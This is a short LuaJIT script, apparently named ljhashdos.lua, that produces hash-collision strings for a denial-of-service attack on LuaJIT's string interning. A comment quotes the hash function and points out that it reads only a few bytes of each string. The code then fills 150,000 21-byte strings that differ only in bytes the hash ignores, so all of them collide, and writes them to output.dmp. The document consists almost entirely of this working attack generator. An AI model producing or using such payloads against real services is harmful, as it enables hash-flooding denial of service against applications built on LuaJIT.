-- gonzalez, j
-- ljhashdos.lua
-- jun 2018

--[[
Speed:
LuaJIT: 166666667 strings / second
     C: 227272727 strings / second

Hash function (Mike Pall / Bob Jenkins):
  MSize len = (MSize)lenx;
  MSize a, b, h = len;
  if (lenx >= LJ_MAX_STR)
    lj_err_msg(L, LJ_ERR_STROV);
  g = G(L);
  /* Compute string hash. Constants taken from lookup3 hash by Bob Jenkins. */
  if (len >= 4) {  /* Caveat: unaligned access! */
    a = lj_getu32(str);
    h ^= lj_getu32(str+len-4);
    b = lj_getu32(str+(len>>1)-2);
    h ^= b; h -= lj_rol(b, 14);
    b += lj_getu32(str+(len>>2)-1);
  } else if (len > 0) {
    a = *(const uint8_t *)str;
    h ^= *(const uint8_t *)(str+len-1);
    b = *(const uint8_t *)(str+(len>>1));
    h ^= b; h -= lj_rol(b, 14);
  } else {
    return &g->strempty;
  }
  a ^= h; a -= lj_rol(h, 11);
  b ^= a; b -= lj_rol(a, 25);
  h ^= b; h -= lj_rol(b, 16);
]]

local ffi = require 'ffi'
local bit = require 'bit'

do
  ffi.cdef 'typedef char collidable[21];'

  ffi.cdef
  [[
  typedef struct {
    char *fpos;
    void *base;
    unsigned short handle;
    short flags;
    short unget;
    unsigned long alloc;
    unsigned short buffincrement;
  } FILE;

  int fwrite(const void *array, size_t size, size_t count, FILE *stream);
  ]]
end

local function save(buffer, amount)
  local file = io.open('output.dmp', 'wb')

  ffi.C.fwrite(
    buffer,
    ffi.sizeof('collidable'),
    amount,
    file)

  file:close()
end


local function get(spacer, outputs_desired)
  local buffer = ffi.new('collidable[?]', outputs_desired)

  ffi.fill(buffer, ffi.sizeof(buffer), spacer:byte())

  local a, b, c, d, e
  local bit_rshift = bit.rshift
  for buf_pos = 0, outputs_desired - 1 do
    a, b, c, d, e =
      buf_pos,
      bit_rshift(buf_pos, 4),
      bit_rshift(buf_pos, 8),
      bit_rshift(buf_pos, 12),
      bit_rshift(buf_pos, 16)

    buffer[buf_pos][12] = 35 + (a % 64) -- 35 is an offset to the ascii character table. 35 -> #
    buffer[buf_pos][13] = 35 + (b % 64)
    buffer[buf_pos][14] = 35 + (c % 64)
    buffer[buf_pos][15] = 35 + (d % 64)
    buffer[buf_pos][16] = 35 + (e % 64)
  end

  return buffer
end

do
  local amount = 150000
  local buffer = get('a', amount)
  save(buffer, amount)
end